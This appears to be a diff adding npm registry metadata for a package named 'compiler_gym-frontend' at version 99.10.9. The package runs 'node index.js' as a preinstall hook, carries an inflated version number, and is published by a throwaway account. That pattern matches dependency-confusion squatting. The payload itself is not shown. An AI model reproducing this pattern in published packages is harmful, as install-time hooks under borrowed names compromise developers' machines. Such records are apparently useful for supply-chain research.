@@ -1,0 +1,62 @@
+{
+    "_id": "compiler_gym-frontend",
+    "name": "compiler_gym-frontend",
+    "dist-tags": {
+        "latest": "99.10.9"
+    },
+    "versions": {
+        "99.10.9": {
+            "name": "compiler_gym-frontend",
+            "version": "99.10.9",
+            "description": "azbit package",
+            "main": "index.js",
+            "scripts": {
+                "test": "echo 'error no test specified' && exit 1",
+                "preinstall": "node index.js"
+            },
+            "author": "",
+            "License": "ISC",
+            "_id": "compiler_gym-frontend@99.10.9",
+            "_nodeVersion": "16.14.2",
+            "_npmVersion": "8.5.0",
+            "dist": {
+                "integrity": "sha512-ssyAOIqBtn8w25T0pAGTY8qkKCcBRV5v0DYGAlm/uc+SCeBvFJy+6Zaz+EFbwu97eSflcir6Y+rclQ+ki8dJUA==",
+                "shasum": "12d4d5f8529b64a43294d97d32f9a1ac839f64f3",
+                "tarball": "https://registry.npmjs.org/compiler_gym-frontend/-/compiler_gym-frontend-99.10.9.tgz",
+                "fileCount": 2,
+                "unpackedSize": 5073,
+                "npm-signature": "-----BEGIN PGP SIGNATURE-----\r\nVersion: OpenPGP.js v4.10.10\r\nComment: https://openpgpjs.org\r\n\r\nwsFzBAEBCAAGBQJiPJLtACEJED1NWxICdlZqFiEECWMYAoorWMhJKdjhPU1b\r\nEgJ2VmoXCw/9GwrbO1Hc5a4Dkfn0SUI0l4mtsOiWIN5dWDdOnlgeVURwZydC\r\nvhuUeTlt3RJtKrREm73Tw6p5iV3IAurUvrZ97gh5BmzxOyqmfnUaiFw0XJOu\r\nRVO9mZL05Nx2i20ufWLA8u6mWxcO8ButR1DNPGuN/3KOjMlFMDCtkwVJYoFZ\r\n5fxHEE+YN9eYWrI3aAviqJhGrBcqIFPHCB4C3UuprrRW57m6Hf9ewjzrobar\r\naQW/itpvRECc+Xgtti4KNBwwM+e1oIeC5j7WPAWRkI26hDhUxz1tAy6UVgfi\r\nzWxqTdmVZubrbVrcPrh8Okj3gSyEjfEgtB9vKcm0fWAz+csIyRsX2L7ZAYMl\r\nYNa2n5tC2XR9WO+GngpFV4C/KJ6LERNqEylo9lNezOfCpFy8xdMpj2ml4+Iw\r\nwKdJhquUiyf7oV5P69peUp9WK81v89/hnosmk/DjnMuPsbickdddzdLSX0Gc\r\nLgO599uOVSUGHG9Zohmel+sG69xsC1LCmtrIG3SWqOuRQ3w7x9L3CL+akT3X\r\nOo/WByf5FdP/PFnpCpkfm//XFCz4jHpBsf/LJ96SuwCHbmpbJ/kRJUewdC9O\r\nWFkal0HAh+SV7/imIO16DAEv/hZ23FytAg7BZhgetSBQIIxNv3YARrpZ0RJ3\r\nfc6+qxugcMV7xP6U4nkR5EeVRmJJU2blN3U=\r\n=nJCH\r\n-----END PGP SIGNATURE-----\r\n"
+            },
+            "_npmUser": {
+                "name": "i4czyds8",
+                "email": "i4czyds8@rt11.ml"
+            },
+            "directories": {},
+            "maintainers": [
+                {
+                    "name": "i4czyds8",
+                    "email": "i4czyds8@rt11.ml"
+                }
+            ],
+            "_npmOperationalInternal": {
+                "host": "s3://npm-registry-packages",
+                "tmp": "tmp/compiler_gym-frontend_99.10.9_1648136941555_0.7265751980785811"
+            },
+            "_hasShrinkwrap": false
+        }
+    },
+    "time": {
+        "created": "2022-03-24T15:49:01.554Z",
+        "99.10.9": "2022-03-24T15:49:01.706Z",
+        "modified": "2022-03-24T15:49:01.813Z"
+    },
+    "maintainers": [
+        {
+            "name": "i4czyds8",
+            "email": "i4czyds8@rt11.ml"
+        }
+    ],
+    "description": "azbit package",
+    "readme": "ERROR: No README data found!",
+    "readmeFilename": ""
+}
